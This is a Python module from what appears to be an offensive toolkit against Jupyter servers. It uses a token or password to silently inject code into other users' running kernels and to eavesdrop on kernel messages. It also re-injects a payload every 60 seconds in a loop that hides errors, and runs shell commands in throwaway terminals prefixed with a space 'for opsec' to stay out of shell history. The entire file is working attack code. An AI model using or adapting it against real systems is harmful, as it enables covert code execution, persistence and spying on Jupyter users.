import uuid
import asyncio
import json
from urllib.parse import urlparse
from websockets import connect
import argparse
from vger.connection import Connection
import re
import time


async def recv_all(connection, conn, timeout):
    while True:
        try:
            async with asyncio.timeout(timeout):
                msg = json.loads(await conn.recv())
                if msg["msg_type"] in ["stream", "execute_reply", "execute_result"]:
                    if msg["msg_type"] in ["stream", "execute_reply"]:
                        text = msg["content"]["text"]
                    elif msg["msg_type"] in ["execute_result"]:
                        text = msg["content"]["data"]
                    connection.print_with_rule(
                        f"[bold blue]RESULT> {text}", category="[bold blue]RESULT"
                    )
                elif msg["msg_type"] in ["execute_input"]:
                    connection.print_with_rule(
                        f"[bold red]REQUEST> {msg['content']['code']}",
                        category="[bold red]REQUEST",
                    )
        except:
            break


async def attack_session(connection, session, code, silent=True, print_out=True):
    jpy_sess = connection.jpy_sessions[session]
    code_msg_id = str(uuid.uuid1())
    code_msg = {
        "channel": "shell",
        "content": {"silent": silent, "store_history": False, "code": code},
        "header": {"msg_id": code_msg_id, "msg_type": "execute_request"},
        "metadata": {},
        "parent_header": {},
    }

    ws_base_url = urlparse(connection.url)._replace(scheme="ws").geturl()
    ws_url = (
        ws_base_url
        + f'api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}'
    )
    async with connect(
        ws_url, extra_headers=connection.headers, close_timeout=5
    ) as conn:
        await recv_all(connection, conn, timeout=1)
        if print_out:
            connection.print_with_rule(
                f"[bold red]INJECT> {code_msg['content']['code']}",
                category="[bold red]CODE INJECTED",
            )
        await conn.send(json.dumps(code_msg))
        return await recv_all(connection, conn, timeout=1)


async def send_to_terminal(ws, code):
    await ws.send(json.dumps(["stdin", " " + code + "\n"]))  # space for opsec


async def recv_from_terminal(ws):
    while True:
        message = await ws.recv()
        data = json.loads(message)
        if len(data) > 1 and data[0] == "stdout":
            yield f"{data[1]}"


async def run_in_terminal(connection, terminal, code, timeout=2, stdout=True):
    ws_base_url = urlparse(connection.url)._replace(scheme="ws").geturl()
    ws_url = ws_base_url + f"terminals/websocket/{terminal}"
    out = list()
    try:
        async with connect(
            ws_url, extra_headers=connection.headers, close_timeout=timeout
        ) as conn:
            await send_to_terminal(conn, code)
            if stdout:
                out = list()
                async with asyncio.timeout(timeout):
                    with connection.con.status("Receiving.."):
                        async for result in recv_from_terminal(conn):
                            out.append(result)

    except asyncio.TimeoutError:
        if stdout:
            return out


async def run_ephemeral_terminal(connection, code, timeout=2, stdout=True):
    def strip_ansi_codes(text):
        ansi_escape = re.compile(r"(?:\x1b\[|\x9b)[0-?]*[ -/]*[@-~]")
        return ansi_escape.sub("", text)

    new_term = connection.create_terminal()
    result = await run_in_terminal(connection, new_term["name"], code, timeout, stdout)
    if stdout:
        result = [strip_ansi_codes(x) for x in result]
        connection.print_with_rule("".join(result))
    connection.delete_terminal(new_term["name"])


async def snoop(connection, session, timeout=60):
    jpy_sess = connection.jpy_sessions[session]
    ws_base_url = urlparse(connection.url)._replace(scheme="ws").geturl()
    ws_url = (
        ws_base_url
        + f'api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}'
    )

    async with connect(
        ws_url, extra_headers=connection.headers, close_timeout=timeout
    ) as conn:
        await recv_all(connection, conn, timeout)


def stomp(connection, target, payload_str, frequency=60):
    while True:
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(
                attack_session(
                    connection, target, payload_str, silent=True, print_out=False
                )
            )
            time.sleep(frequency)
        except:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Connect to target")
    parser.add_argument("socket", type=str, help="Target socket as http://host:port/")
    parser.add_argument("secret", type=str, help="Token or password")
    args = parser.parse_args()
    c = Connection(args.socket, args.secret)
    loop = asyncio.new_event_loop()
    loop.run_until_complete(run_ephemeral_terminal(c, "ls"))
